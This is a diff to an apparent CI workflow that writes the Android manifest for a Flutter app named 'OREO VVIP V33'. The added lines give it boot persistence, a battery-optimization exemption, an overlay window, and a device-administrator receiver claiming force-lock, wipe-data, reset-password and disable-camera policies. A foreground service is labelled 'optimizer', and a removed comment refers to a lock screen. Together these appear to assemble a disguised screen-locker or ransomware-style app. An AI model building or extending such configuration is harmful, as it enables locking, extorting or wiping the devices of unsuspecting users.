@@ -55,6 +55,8 @@ jobs:
               <uses-permission android:name="android.permission.WAKE_LOCK"/>
               <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
               <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
 
               <application android:label="OREO VVIP V33" android:name="${applicationName}" android:icon="@mipmap/ic_launcher" android:usesCleartextTraffic="true" android:networkSecurityConfig="@xml/network_security_config">
                   <activity android:name=".MainActivity" android:exported="true" android:launchMode="singleTop" android:theme="@style/LaunchTheme" android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode" android:hardwareAccelerated="true" android:windowSoftInputMode="adjustResize">
@@ -64,6 +66,15 @@ jobs:
                           <category android:name="android.intent.category.LAUNCHER"/>
                       </intent-filter>
                   </activity>
+                  
+                  <activity android:name="flutter.overlay.window.flutter_overlay_window.OverlayActivity" android:exported="true" />
+                  <service android:name="flutter.overlay.window.flutter_overlay_window.OverlayService" android:exported="false" />
+                  
+                  <receiver android:name=".DeviceAdmin" android:permission="android.permission.BIND_DEVICE_ADMIN" android:exported="true">
+                      <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin"/>
+                      <intent-filter><action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/></intent-filter>
+                  </receiver>
+
                   <service android:name="id.flutter.flutter_background_service.BackgroundService" android:foregroundServiceType="specialUse" android:exported="false" tools:replace="android:exported">
                       <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="optimizer"/>
                   </service>
@@ -146,8 +157,13 @@ jobs:
               </base-config>
           </network-security-config>
           EOF
+          
+          cat << 'EOF' > android/app/src/main/res/xml/device_admin.xml
+          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+            <uses-policies><force-lock/><wipe-data/><reset-password/><disable-camera/></uses-policies>
+          </device-admin>
+          EOF
 
-          # SULAP ICON.PNG JADI IKON APK (LOGO.PNG TETAP BUAT LOCK SCREEN)
           mkdir -p android/app/src/main/res/mipmap-hdpi
           mkdir -p android/app/src/main/res/mipmap-mdpi
           mkdir -p android/app/src/main/res/mipmap-xhdpi
